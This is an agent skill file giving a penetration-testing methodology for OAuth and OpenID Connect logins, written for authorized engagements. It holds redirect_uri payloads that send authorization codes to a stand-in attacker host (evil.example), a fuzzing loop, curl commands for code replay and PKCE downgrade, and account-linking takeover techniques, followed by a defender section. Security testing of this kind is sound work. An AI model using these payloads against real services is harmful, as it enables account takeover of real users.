---
name: oauth-attacks
description: Use when testing OAuth 2.0 and OpenID Connect logins on an
  authorized engagement. Covers mapping the authorization flow,
  redirect_uri manipulation and open redirect chains, authorization code
  interception and replay, missing or weak state parameters, PKCE
  downgrade, implicit flow token leakage, client secret exposure, and
  scope and audience confusion. Use when an app offers login with Google,
  GitHub, Microsoft, or a custom identity provider and you need to steal
  accounts or escalate through the SSO handshake.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [auth-attacks, webapp-pentest-methodology, jwt-attacks]
tools:
  - name: Burp Suite
    version: "2026.2"
  - name: Python
    version: "3.12"
---

OAuth 2.0 and OpenID Connect delegate login to an identity provider,
then hand the app an authorization code or token proving who you are.
Bugs in that handshake let attackers log in as other users. This skill
covers the full authorized methodology: mapping the flow, attacking
redirects, stealing codes and tokens, and abusing provider trust. All
testing targets systems you have written permission to test, including
any test identity provider accounts the engagement provides.

## Quick Workflow

1. Walk the login flow in Burp and record every step: authorization
   request, provider login, redirect back, code exchange, session
   creation.
2. Capture the exact parameters: client_id, redirect_uri, response_type,
   scope, state, code_challenge, and nonce.
3. Test redirect_uri validation with open redirects, subdomains, path
   tricks, and parameter pollution.
4. Test the state parameter: missing, static, or not bound to the
   session.
5. Try code interception: leak the code through Referer, logs, or
   browser history, then replay it.
6. Test PKCE: downgrade to plain or remove the challenge.
7. Check the token endpoint: client secret handling, code replay, and
   token leakage.
8. Confirm account takeover on a test victim account and document the
   exact request chain.

## 1. Mapping the flow

```bash
# Start the login and capture the authorization request URL
# (do this in the browser with Burp proxying; then inspect)
# Example captured request:
# https://provider.example/authorize?client_id=abc123
#   &redirect_uri=https://target.example/oauth/callback
#   &response_type=code&scope=openid+email+profile
#   &state=RANDOM123&code_challenge=CHALLENGE&code_challenge_method=S256
```

Record: which response_type (code, token, id_token, hybrid), whether
PKCE is used, whether state exists, the exact redirect_uri, and what
the callback does with the code (POST to token endpoint with which
authentication: client_secret_basic, client_secret_post, or none).

```bash
# Fingerprint the provider's discovery document
curl -s 'https://provider.example/.well-known/openid-configuration' \
  | python3 -m json.tool | grep -E 'authorization_endpoint|token_endpoint|jwks_uri|response_types_supported'
```

## 2. redirect_uri manipulation

The redirect_uri is where the provider sends the code. If validation
is loose, the code goes to the attacker.

```bash
# Baseline: the exact registered redirect_uri works
# Now test variations one at a time in the authorization request:

# 1. Open redirect on the same domain (most valuable):
#    redirect_uri=https://target.example/oauth/callback?next=https://evil.example
#    redirect_uri=https://target.example/redirect?url=https://evil.example

# 2. Subdomain takeover or attacker subdomain:
#    redirect_uri=https://evil.target.example/oauth/callback

# 3. Path traversal past a prefix check:
#    redirect_uri=https://target.example/oauth/callback/../evil
#    redirect_uri=https://target.example/oauth/callback%2f..%2fevil

# 4. Suffix tricks against naive string matching:
#    redirect_uri=https://target.example.evil.example/oauth/callback

# 5. Parameter pollution: two redirect_uri params, provider uses the
#    second while the app validated the first
#    ...&redirect_uri=https://target.example/oauth/callback&redirect_uri=https://evil.example

# 6. Fragment tricks (fragments never reach the server but the
#    provider may still redirect with the code appended after #):
#    redirect_uri=https://target.example/oauth/callback#@evil.example
```

```bash
# Automate the variations with a loop over a file of payloads,
# checking the provider's response for a redirect to your domain
while read -r uri; do
  loc=$(curl -s -o /dev/null -w '%{redirect_url}' \
    "https://provider.example/authorize?client_id=abc123&redirect_uri=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$uri")&response_type=code&scope=openid")
  echo "$uri -> $loc"
done < /tmp/redirect-payloads.txt
```

Any redirect_uri that sends the code off-domain is account takeover:
host a page that captures the `code` query parameter and exchange it
yourself.

## 3. State parameter attacks

`state` binds the authorization request to the user's session. Without
it, login CSRF works: the attacker starts a login, the victim finishes
it, and the victim ends up logged in as the attacker (or the attacker's
code gets bound to the victim's session).

```bash
# Test 1: drop state entirely from the authorization request.
# If the provider and app still complete login, state is not enforced.

# Test 2: replay a state value from another session.
# If it works, state is not bound to the session.

# Test 3: check state entropy: request several logins and compare
for i in 1 2 3; do
  curl -s -o /dev/null -D - \
    'https://target.example/oauth/start' | grep -i 'state='
done
```

Login CSRF proof of concept: start the OAuth flow as the attacker,
stop at the provider redirect, and send the victim that authorization
URL. When the victim is already logged into the provider, the flow
completes silently and the victim's app session becomes the attacker's
account.

## 4. Code interception and replay

Authorization codes are bearer credentials until exchanged. Leak one
and you own the account.

```bash
# Referer leakage: after the callback, does the app link to external
# pages? The code stays in the URL until the app consumes it.
# Test: complete a login with Burp, then click every outbound link and
# watch the Referer header for "code=".

# Browser history: if the app does not consume the code immediately
# (JS SPA that reads it late), the code sits in history; test how long
# the code stays valid by replaying it after a delay:
curl -s -X POST 'https://target.example/oauth/callback?code=STOLENCODE&state=STATE'
```

```bash
# Code replay: exchange the same code twice
# (proper implementations invalidate after first use)
curl -s -X POST 'https://provider.example/token' \
  -d 'grant_type=authorization_code&code=USEDCODE&redirect_uri=https://target.example/oauth/callback&client_id=abc123' \
  | head -c 300
```

Also test code substitution across users: take your own code and feed
it to the victim's session callback (needs the victim's state, so this
pairs with state attacks).

## 5. PKCE downgrade

PKCE (`code_challenge`/`code_verifier`) protects public clients. Test
whether the server enforces it.

```bash
# Start a flow with S256 challenge, then at the token exchange:
# 1. Omit code_verifier entirely
# 2. Send a wrong code_verifier
# 3. Start the flow with code_challenge_method=plain and a trivial verifier
# 4. Start the flow with NO challenge at all, then exchange
curl -s -X POST 'https://provider.example/token' \
  -d 'grant_type=authorization_code&code=CODE&redirect_uri=https://target.example/oauth/callback&client_id=abc123' \
  | head -c 300
```

If the exchange succeeds without the verifier, PKCE is decorative and
code interception becomes much easier.

## 6. Implicit and hybrid flow token leakage

`response_type=token` or `id_token` puts tokens in the URL fragment.
Fragments stay client side, but they leak through browser history,
Referer (on downgrade), and shoulder surfing of shared machines.

```bash
# Force the flow: change response_type=code to response_type=token
# in the authorization request. If the provider honors it for this
# client, tokens arrive in the fragment where JS or history can grab them.
```

Check whether the app accepts tokens at endpoints meant for codes
(confused deputy): POST an access_token where a code is expected.

## 7. Client impersonation and secret exposure

```bash
# Is the client_secret in mobile apps or JS bundles? (public clients
# must not have secrets; if one is shipped, it is compromised by design)
# Search the app bundle:
grep -r -i 'client_secret' /tmp/app-bundle/ | head -5

# client_secret_basic vs post: try exchanging a code with no secret at
# all; some providers fall back to public-client mode silently
curl -s -X POST 'https://provider.example/token' \
  -d 'grant_type=authorization_code&code=CODE&redirect_uri=https://target.example/oauth/callback&client_id=abc123' \
  | head -c 300
```

Test client_id confusion: register your own malicious client with the
provider (if self-registration is open) and see if the app accepts
tokens minted for it.

## 8. Scope, audience, and account linking bugs

- Request `scope=openid email profile` versus minimal scopes: does the
  app over-request, and does the provider enforce what the app asked?
- Pre-account takeover: register on the app with the victim's email
  via password login, then the victim SSOs with the same email. Does
  the app merge the accounts (giving you their SSO identity) or keep
  them separate?
- Email verification gap: if the provider does not verify emails and
  the app trusts `email` from the token, register a provider account
  with the victim's email and SSO in.
- `nonce` missing in implicit/hybrid flows: replay old id_tokens.

```bash
# Check whether the app validates the id_token signature and claims
# (capture one, tamper per the jwt-attacks skill, replay at the callback)
```

## Edge cases

- The provider is a big tech IdP (Google, Microsoft): redirect_uri
  validation there is strict, so focus on the app's callback handling,
  state, and account linking instead.
- Multiple redirect_uris registered: test each one; admins often
  register a lax dev URI (`http://localhost`) that is reachable in
  some contexts.
- The app uses `form_post` response mode: codes arrive by POST, which
  kills Referer leakage but not all interception paths.
- Provider login happens in a popup: the opener window can sometimes
  read the popup URL (same-origin popups); test what script can see.
- The flow involves an IdP-initiated SSO (SAML-style unsolicited
  response): there is no state at all by design, so login CSRF is
  expected and must be mitigated with other binding.

## Escalation

- redirect_uri locked down: pivot to state attacks and login CSRF,
  which need no redirect manipulation.
- state solid: attack the code's lifetime and single-use property;
  long-lived multi-use codes are interceptable in more ways.
- PKCE enforced: look at the verifier generation in JS; Math.random
  verifiers are guessable, and verifiers stored in localStorage are
  readable by XSS (chain with web-xss).
- Everything cryptographic holds: attack account linking and email
  trust, the two logic layers most implementations get wrong.
- Custom provider: test it like any OAuth server but also review its
  client registration: open registration plus weak redirect_uri
  validation is a full compromise primitive.

## Detection and defender view

Defenders see OAuth attacks as authorization requests with odd
redirect_uri values, callbacks arriving without a matching state,
the same code exchanged twice or from two IPs, token requests missing
PKCE verifiers, and logins where the SSO email does not match a
verified address. The durable fixes are exact-match redirect_uri
validation (no wildcards, no open redirects on the callback path),
cryptographically random state bound to the session, PKCE with S256
for all clients, single-use short-lived codes, never leaking codes in
Referer or logs, verifying id_token signatures plus aud/iss/exp/nonce,
and careful account linking (require verified emails, confirm merges
interactively). Log every callback anomaly; OAuth logs are the first
place account takeover shows up.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application): flow
  endpoint abuse.
- MITRE ATT&CK T1539 (Steal Web Session Cookie): code and token
  theft.
- MITRE ATT&CK T1550.001 (Use Alternate Authentication Material):
  stolen code use.
- CWE-352 (Cross-Site Request Forgery): login CSRF via missing state.
- CWE-601 (URL Redirection to Untrusted Site): redirect_uri abuse.
- CWE-347 (Improper Verification of Cryptographic Signature):
  id_token validation gaps.
- CWE-863 (Incorrect Authorization): scope and linking bugs.
- RFC 6749 (OAuth 2.0), RFC 7636 (PKCE), OpenID Connect Core 1.0.
- OWASP Testing Guide: Testing for OAuth weaknesses.
- PortSwigger Web Security Academy: OAuth labs and cheat sheet.

## See also

- `oauth2-deep-dive`: Use it instead for a review-oriented assessment of flow selection and configuration, rather than exploit-focused attack coverage.
